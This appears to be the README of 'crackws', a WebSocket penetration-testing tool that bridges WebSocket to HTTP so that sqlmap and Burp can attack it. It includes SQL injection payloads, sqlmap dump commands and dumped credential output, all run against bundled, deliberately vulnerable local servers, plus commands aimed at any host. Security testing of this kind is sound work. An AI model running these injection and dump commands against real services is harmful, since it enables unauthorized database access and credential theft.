# crackws

> 由 **guaidao2 & coolmoon** 开发 · [MIT 协议](LICENSE)开源 · © 2026

**WebSocket 渗透测试框架 —— 核心能力是把 WebSocket 桥接成本地 HTTP，让 sqlmap / Burp / curl / nuclei 这些只会说 HTTP 的工具直接打 WebSocket 协议。**

```
                    ┌──────────────────────────────┐
   sqlmap  ──HTTP──▶│  crackws bridge :8899        │
   Burp    ──HTTP──▶│  HTTP ⇄ WebSocket 会话映射    │──WS──▶  目标 :8765
   curl    ──HTTP──▶│  会话池 / 模板注入 / 响应聚合  │
                    └──────────────────────────────┘
```

## 为什么需要它

WebSocket 应用（聊天、协作、实时推送、CTF 靶场）把业务逻辑放在消息层，HTTP 扫描器完全看不见：

- 没有 URL 参数可以让 sqlmap 注入；
- 响应是**多条帧**，不是一个 HTTP body；
- 认证在**连接级**（登录后整条连接带着会话）；
- 手写脚本只能打单点，无法复用 sqlmap 的布尔/时间/UNION 等完整检测引擎。

crackws 补齐这一层：把「HTTP 请求 ⇄ WebSocket 消息」的映射、会话保持、多帧聚合都做完，于是 `sqlmap -u "http://127.0.0.1:8899/msg/login?username=admin&password=1" -p password` 就能对纯 WebSocket 协议做完整 SQL 注入。

同时 crackws 自身也具备 WS 渗透能力：协议逆向、类型/字段枚举、认证绕过、SQL/NoSQL/命令注入/SSTI/XSS 检测、字典 fuzz 与聚类、录制回放、报告导出、交互式 REPL。

## 构建

```bash
make build          # 本机调试构建 -> ./bin/crackws
make release        # 发布构建 -> ./dist/（7 个平台 + SHA256SUMS.txt）
make test           # 单元测试（离线，使用内置 mock WS 服务器）
make test-live      # 对真实靶场跑集成测试
```

无第三方运行时依赖（仅编译期依赖 `gopkg.in/yaml.v3`）。发布构建用 `CGO_ENABLED=0` 静态链接并带 `-trimpath -ldflags "-s -w"`，Linux 产物可直接丢进任意容器。

### 发布构建：按机器配置自动限流

`scripts/release.sh` 不做硬编码，而是**先探测本机配置、再据此决定编译条件**。

核心判断是：**Go 编译的瓶颈是内存，不是 CPU**。每个并行编译的包都要持有大量类型信息，小内存机器上并发过高会直接 OOM。所以并行度由 *可用内存* 反推，而不是 `nproc`：

```
budget        = MemAvailable - 768 MiB       # 给桌面/编辑器留余量
jobs          = clamp(budget / 512 MiB, 1, min(cpu, 4))
GOMAXPROCS    = jobs                         # 单包内部编译也并行，会叠加峰值
GOMEMLIMIT    = budget / jobs                # 每进程软上限，使总占用落在预算内
priority      = nice -n 19 ionice -c 3       # 最低调度优先级，编译时机器仍可用
```

在开发本项目的机器上（4 vCPU / 3.8 GiB 总内存 / ~2.0 GiB 可用）实测推导结果：

```
machine      4 cpu(s), 1924 MiB available / 3881 MiB total, 953 MiB swap
toolchain    go1.26.4
plan         -p 2 parallel package compiles
             GOMAXPROCS=2   GOMEMLIMIT=578MiB per process
             budget 1156 MiB (reserving 768 MiB), priority: nice -n 19 ionice -c 3
platforms    linux/amd64 linux/arm64 linux/arm/7 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64

  linux/amd64            ok     9.2M    0.3s
  linux/arm64            ok     8.5M    9.1s
  linux/arm/v7           ok     8.7M    7.9s
  darwin/amd64           ok     9.4M    9.2s
  darwin/arm64           ok     8.7M    9.5s
  windows/amd64          ok     9.4M    9.7s
  windows/arm64          ok     8.6M   10.0s
──────────────────────────────────────────────────────────────
7 artefact(s) in 56s
```

各平台是**串行**编译的（不并行跑多个 `go build`），否则总并发会乘以平台数。

可覆盖项：

| 变量 | 作用 |
|---|---|
| `VERSION=1.2.3` | 写入 `-ldflags -X ...version.Version` |
| `PLATFORMS="linux/amd64"` | 只编译指定平台（空格分隔） |
| `JOBS=1` | 强制并行度（内存极小时） |
| `PER_JOB_MB` / `RESERVE_MB` | 调整每任务内存估算与保留量 |
| `UPX=1` | 追加 upx 压缩（CPU 密集，默认关闭） |
| `DIST=out` | 产物目录（默认 `dist/`） |

每个二进制都注入版本与构建时间戳。`version.Version` / `version.Commit` / `version.BuildTime` 在源码里是 `var` 而非 `const`，因为 `-ldflags -X` 只能覆盖变量：

```bash
$ ./dist/crackws_0.1.0_linux_amd64 version
crackws 0.1.0 - WebSocket penetration testing framework with an HTTP bridge
developed by guaidao2 & coolmoon · MIT licensed
built 2026-09-26T14:10:00Z
```

校验：

```bash
cd dist && sha256sum -c SHA256SUMS.txt
```

## 快速开始

下列示例全部针对仓库自带的两个本地靶场，可离线复现：

```bash
python3 examples/vuln-ws-server.py &     # ws://127.0.0.1:9100/  JSON 登录 + SQLite（故意可注入）
python3 examples/alt-ws-server.py &      # ws://127.0.0.1:9200/  纯文本协议（形态完全不同）
```

### 1. 指纹识别

```bash
crackws probe --target ws://127.0.0.1:9100/
```

```
Handshake
  status             101 Switching Protocols
  server             Python/3.13 websockets/16.0
  accept valid       true
  handshake time     1.0 ms

Stack guesses
  • python websockets library
  • websockets version 16.0
```

### 2. 协议逆向

```bash
crackws recon --profile examples/vuln-sqli.yaml
```

差分枚举 message type（先发一个必然被拒绝的 type 作基线），再逐个探测每个 type 真正读取的字段：

```
Message types (2)
  type   fields     notes
  login  username
  chat   content
```

对**没有** type 判别符的协议，它如实报告而不是硬凑结果：

```
$ crackws recon --profile examples/alt-protocol.yaml --settle 180
protocol     text
Message types (0)
  • none distinguishable from the rejection baseline
!! no message type was distinguishable from the rejection baseline; the protocol
   may key on a different field or the server may not use a type discriminator.
```

### 3. ★ HTTP 桥接 + sqlmap

```bash
# 终端 A
crackws bridge --profile examples/vuln-sqli.yaml --listen 127.0.0.1:8899

# 终端 B
curl 'http://127.0.0.1:8899/msg/login?username=admin&password=S3cr3t-Adm1n!'
# {"type": "system", "message": "welcome", "role": "admin"}

sqlmap -u 'http://127.0.0.1:8899/msg/login?username=admin&password=1' -p password --batch
```

实测输出：

```
sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:
---
Parameter: password (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
---
[INFO] the back-end DBMS is SQLite

Table: users
[3 entries]
+----+----------------------------+-------+---------------+----------+
| id | note                       | role  | password      | username |
+----+----------------------------+-------+---------------+----------+
| 1  | flag{ws_bridge_sqli_works} | admin | S3cr3t-Adm1n! | admin    |
+----+----------------------------+-------+---------------+----------+
```

换成结构完全不同的纯文本协议（`examples/alt-protocol.yaml`）同样成立：sqlmap 照样 dump 出 `accounts` 表。

### 4. 自身检测能力

```bash
crackws detect --profile examples/vuln-sqli.yaml --request login --param password
```

```
Detection results
  HIGH Boolean-based SQL injection
      id ws.sqli.boolean
      where login → password
      cwe CWE-89
      payload
        TRUE: ' OR '1'='1
        FALSE: ' AND '1'='2
      A payload pair that should evaluate true and false produced replies that are
      stable and consistently different across repeats (single-quote-or)...
```

```bash
crackws fuzz --profile examples/vuln-sqli.yaml --request chat --param content
crackws scan --profile examples/vuln-sqli.yaml --report out.html   # 一条龙
crackws repl --profile examples/vuln-sqli.yaml                     # 交互式
```

## 命令一览

| 命令 | 作用 |
|---|---|
| `probe` | 握手 + 指纹识别 |
| `recon` | 枚举 message type、字段、协议形态 |
| `detect` | 漏洞检测器（SQLi/NoSQLi/命令注入/SSTI/认证绕过/XSS/JSON 注入） |
| `fuzz` | 字典 fuzz + 响应聚类 + 异常排序 |
| `scan` | recon + detect + fuzz 一条龙 |
| `bridge` | **把 WebSocket 暴露成本地 HTTP 服务** |
| `send` | 发送单条消息并打印回复 |
| `replay` | 回放录制流量并 diff，导出 HTTP/curl |
| `repl` | 交互式会话 |
| `profile` | 列出/查看/导出 profile |

通用参数：`--profile`、`--target`、`--header`、`--proxy`、`--insecure`、`--max-conns`、`--rate`、`--idle`、`--timeout`、`--fresh-session`、`--no-setup`、`--report`、`--json`、`--verbose`。

## 桥接协议

| 端点 | 行为 |
|---|---|
| `POST /raw` | 请求体作为**一条** WebSocket 消息原样发送 |
| `GET /raw?data=...` | 同上，payload 走 query（方便 sqlmap 用 GET） |
| `GET\|POST /msg/<name>?p=v` | query / form / JSON body 的值填入该模板的占位符 |
| `GET\|POST /<name>?p=v` | 同上（name 已注册时） |
| `GET /` | 使用 `bridge.default_request` |
| `GET /__crackws/health` | 桥接与连接池状态 |
| `GET /__crackws/info` | 已注册模板、可注入参数、统计 |

响应：WebSocket 回复体作为 HTTP body 返回；元数据放响应头（`X-CrackWS-Session`、`X-CrackWS-Frames`、`X-CrackWS-Elapsed-Ms`、`X-CrackWS-Types`）。

特殊 query 参数：

- `__extract=<json.path>` —— 只把某个字段作为 body 返回（盲注时给 sqlmap 更干净的信噪比）；
- `--error-match <substr>` —— 命中时返回非 200（**给 Burp 用；驱动 sqlmap 时不要开**，否则 sqlmap 会警告状态码可能干扰结果）。

### 关键设计：`--fresh-session`

很多 WebSocket 后端**每条连接只允许一次初始化动作**（登录、一次性 token）。池化复用时第二次登录会被拒绝，扫描器看到的所有响应都一样 → 无法检测。

`--fresh-session` 让每个 HTTP 请求使用全新连接，`--no-setup` 跳过 profile 的登录序列：

```bash
crackws bridge --profile examples/vuln-sqli.yaml --listen 127.0.0.1:8899 \
  --fresh-session --no-setup
```

```bash
# 现在每条请求独立、行为可观测：
curl 'http://127.0.0.1:8899/msg/login?username=admin&password=S3cr3t-Adm1n!'
# {"type": "system", "message": "welcome", "role": "admin"}
curl 'http://127.0.0.1:8899/msg/login?username=admin&password=wrong'
# {"type": "error", "message": "bad credentials"}
```

## Profile

> **完整的 profile 编写指南见 [`docs/writing-profiles.md`](docs/writing-profiles.md)** —— 包含字段参考、WebSocket 报文阅读方法、常见坑与三个可抄的完整示例。

Profile 用 YAML 描述一个目标：连接参数、登录序列、消息模板（含注入点）、响应读取策略、各模块默认计划。仓库只内置 `generic` 这一个占位模板；真实目标的 profile 放在 `examples/` 或你自己的文件里：

```yaml
name: my-target
target:
  url: ws://10.0.0.5:9000/
  headers: { Origin: "http://10.0.0.5" }
  proxy: socks5://127.0.0.1:1080
  insecure_tls: false

setup:                       # 每条新连接先执行
  - name: login
    template: '{"type":"login","username":"admin","password":"admin123"}'
    response: { idle_ms: 500, accept_types: [system, login_success] }
    extract:
      - { name: token, path: token }        # 提取为会话变量 {{token}}

requests:
  - name: login
    template: '{"type":"login","username":"{{username}}","password":"{{password}}"}'
    params:
      username: { default: admin, inject: true }
      password: { default: x, inject: true }
    response: { idle_ms: 500, accept_types: [system, error, login_success] }

detect: { request: login, params: [username, password] }
fuzz:   { request: login, param: username, concurrency: 1 }
bridge: { default_request: login, raw_param: data, idle_ms: 400 }
```

查看与导出：

```bash
crackws profile list                                    # 列出内置 profile
crackws profile show examples/vuln-sqli.yaml            # 查看某个 profile
crackws profile export examples/vuln-sqli.yaml > my.yaml
```

## 设计要点

**占位符替换不做 JSON 转义。** `{"password":"{{password}}"}` 收到 `1' OR '1'='1` 时原样写入，引号落到线上。若做转义，payload 在离开客户端前就被中和了——这是渗透工具和普通 SDK 的分界线。需要转义时在参数上写 `escape_json: true`。

**响应按「静默窗口」聚合。** WebSocket 一次请求常回多帧（项目开发时在真实目标上遇到过一次 `login` 回 3 帧：`system` + `login_success` + `user_list`）。`ReadBurst(idle, max)` 读第一帧后持续读到连接静默，再按 `select`（`first`/`last`/`all`/`largest`）与 `accept_types` 选出 body。

**差分必须消除回显。** 服务端把参数原样回显时，「不同 payload → 不同响应」是必然的，朴素比较会报告大量假阳性。所有比较前先做 `stripEchoAll`（HTML 实体解码 + 消除 payload 及其转义形式），并让差值两侧使用**相同**的归一化；NoSQL 等检测还引入良性对照值（control），只有「注入 vs 同样形状的良性值」出现差异才算命中。

**签名忽略易变值。** 时间戳、计数器在比较时归一化为 `TIME`/`#`，避免把噪声当成行为变化。

## 架构

```
cmd/crackws            CLI 入口
internal/wsx           raw WebSocket 传输层：帧编解码、握手、TLS、HTTP/SOCKS5 代理、畸形帧、burst 聚合
internal/proto         JSON 消息模板 + 注入点、JSON path、响应签名/相似度
internal/session       连接池、握手序列、会话变量、限速、fresh-per-request 模式
internal/bridge        ★ WS ⇄ HTTP 桥接
internal/recon         协议逆向：指纹、type 枚举、字段探测、状态机线索
internal/detect        漏洞检测器 + 差分引擎（echo-aware）
internal/fuzz          字典 fuzz、响应聚类、异常排序
internal/replay        录制、回放、diff、HTTP/curl 导出
internal/report        JSON / Markdown / HTML 报告
internal/profile       YAML profile 与内置目标描述
internal/repl          交互式命令语言
internal/wstest        测试用进程内 WebSocket 服务器
internal/cli           子命令、参数、输出渲染
```

## 开发

```bash
go test ./...                                   # 离线单测（wstest 起进程内 WS 服务器）
# 集成测试必须显式指定目标，没有内置默认地址（避免把任何真实资产写进仓库）：
CRACKWS_LIVE_TARGET=ws://127.0.0.1:9100/ \
  go test -tags live ./internal/wsx/ -run Live -v
```

`internal/wstest` 提供进程内 WebSocket 服务器，测试覆盖多帧回复、分片、ping/pong、畸形帧与差分逻辑，无需外部依赖。

## 适用范围：不是只能打靶场

crackws 不包含任何针对特定目标的硬编码知识，也**不内置任何指向真实主机的 profile**（内置的 `generic` 只指向回环地址）。任何 WebSocket 服务都可以接入，按接入成本分三档：

**1. 零配置（`--target` 直连）** —— 探路阶段

```bash
crackws probe --target ws://any-host:port/
crackws recon --target ws://any-host:port/            # 自动摸协议形态
crackws bridge --target ws://any-host:port/ --listen 127.0.0.1:8899   # raw 模式即可转发
```

不写 profile 也能：指纹识别、协议逆向、以及用 `POST /raw`（或 `?data=`）把 HTTP 请求体**原样**灌进 WebSocket。sqlmap 用 `--data` 配合 `/raw` 就能打没有参数映射的协议。

**2. 写一份 profile** —— 让参数可注入（推荐）

profile 只描述「消息长什么样、哪些位置是注入点、回复怎么读」，与 crackws 内部实现无关：

```yaml
requests:
  - name: message
    template: '{"jsonrpc":"2.0","method":"{{method}}","params":{"q":"{{q}}"}}'
    params:
      method: { default: search, inject: true }
      q:      { default: hello,  inject: true }
```

**3. 复用一份现成 profile 改 URL** —— 协议形态相同的目标

```bash
crackws recon --profile examples/vuln-sqli.yaml --target ws://10.0.0.9:9000/
```

### 已在两种截然不同的协议上验证

| | `examples/vuln-ws-server.py` | `examples/alt-ws-server.py` |
|---|---|---|
| 报文格式 | JSON 信封 | **纯文本** `LOGIN <user> <pass>` |
| type 判别符 | 有（`{"type":...}`） | **完全没有** |
| 参数位置 | JSON 命名字段 | **空格分隔的位置参数** |
| 连接行为 | 静默 | **连上即推送 banner** |
| bridge + sqlmap | UNION 注入 → dump 出 users | UNION 注入 → dump 出 accounts |

第二种协议用 `crackws recon` 会正确地报告「0 个可区分的 type，该协议可能不用类型判别符」，然后靠 `examples/alt-protocol.yaml` 里的模板照样被 sqlmap 完整攻破：

```bash
python3 examples/alt-ws-server.py &
crackws bridge --profile examples/alt-protocol.yaml --listen 127.0.0.1:8896 --fresh-session
sqlmap -u 'http://127.0.0.1:8896/msg/login?user=root&pass=1' -p pass --batch --dbms=sqlite --dump -T accounts
```

正是这个"难缠"的目标暴露并修掉了两个真实缺陷：**回显被当成行为差异**（recon 在无 type 协议上误报 16 个类型）、**服务端主动推送的 banner 被算进第一个响应**（引入 `settle_ms`）。

## 示例

```bash
python3 examples/vuln-ws-server.py &                        # 可注入的本地目标（127.0.0.1:9100）
crackws bridge --profile examples/vuln-sqli.yaml --listen 127.0.0.1:8899
sqlmap -u 'http://127.0.0.1:8899/msg/login?username=admin&password=1' -p password --batch --dump -T users
```

## 免责声明

本工具用于**授权**的安全测试、CTF 与教学。请仅在你有明确书面许可的目标上使用。使用者需自行遵守所在地法律法规。

## 许可

**MIT License** —— 完整文本见 [LICENSE](LICENSE)。

```
Copyright (c) 2026 guaidao2 & coolmoon
```

项目中 `examples/` 下的两个靶场服务（`vuln-ws-server.py`、`alt-ws-server.py`）是**故意留有漏洞**的测试夹具，同样以 MIT 协议提供，仅可用于本地隔离环境。
